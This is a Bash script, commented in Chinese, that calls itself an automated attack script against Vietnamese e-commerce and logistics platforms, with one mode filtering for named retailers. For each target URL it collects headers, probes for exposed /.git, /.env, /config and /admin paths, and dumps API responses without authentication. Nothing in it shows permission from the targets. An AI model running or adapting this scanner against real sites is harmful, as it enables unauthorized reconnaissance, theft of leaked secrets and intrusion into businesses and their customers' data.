#!/bin/bash
# 自动化攻击脚本 - 越南电商/物流

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 越南电商/物流自动化渗透测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "选择攻击模式："
echo "1. 🔥 快速扫描（测试环境）- 推荐"
echo "2. 🎯 深度测试（小型平台API）"
echo "3. 💎 完整扫描（所有目标）"
echo "4. 🔍 自定义目标"
echo ""
read -p "请选择 [1-4]: " mode

case $mode in
    1)
        echo "[*] 模式1: 测试环境快速扫描"
        TARGET_FILE="reports/priority_critical.txt"
        grep -E "test|staging|uat|dev" $TARGET_FILE > /tmp/targets.txt
        ;;
    2)
        echo "[*] 模式2: 小型平台深度测试"
        grep -E "ankhang|mediamart|metastore" reports/priority_critical.txt > /tmp/targets.txt
        ;;
    3)
        echo "[*] 模式3: 完整扫描"
        cat reports/priority_critical.txt > /tmp/targets.txt
        ;;
    4)
        echo "[*] 模式4: 自定义"
        read -p "输入目标文件路径: " custom
        cat $custom > /tmp/targets.txt
        ;;
esac

echo ""
echo "[*] 目标数量: $(wc -l < /tmp/targets.txt)"
echo "[*] 开始测试..."
echo ""

# 测试每个目标
cat /tmp/targets.txt | while read url; do
    domain=$(echo $url | sed 's|https\?://||' | cut -d'/' -f1)
    
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🎯 测试目标: $url"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # 1. 基础信息
    echo "[1] 基础信息收集..."
    curl -sk -I "$url" | head -10
    
    # 2. 目录扫描（快速）
    echo ""
    echo "[2] 敏感路径探测..."
    for path in /admin /api /test /debug /.git /.env /config; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" "${url}${path}" 2>/dev/null)
        [ "$code" = "200" ] && echo "  [✅] ${url}${path} - 200"
        [ "$code" = "403" ] && echo "  [⚠️] ${url}${path} - 403 (存在)"
    done
    
    # 3. API测试
    if [[ $url == *"api"* ]]; then
        echo ""
        echo "[3] API鉴权测试..."
        curl -sk "$url" | head -20
    fi
    
    echo ""
    sleep 2
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 扫描完成！"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
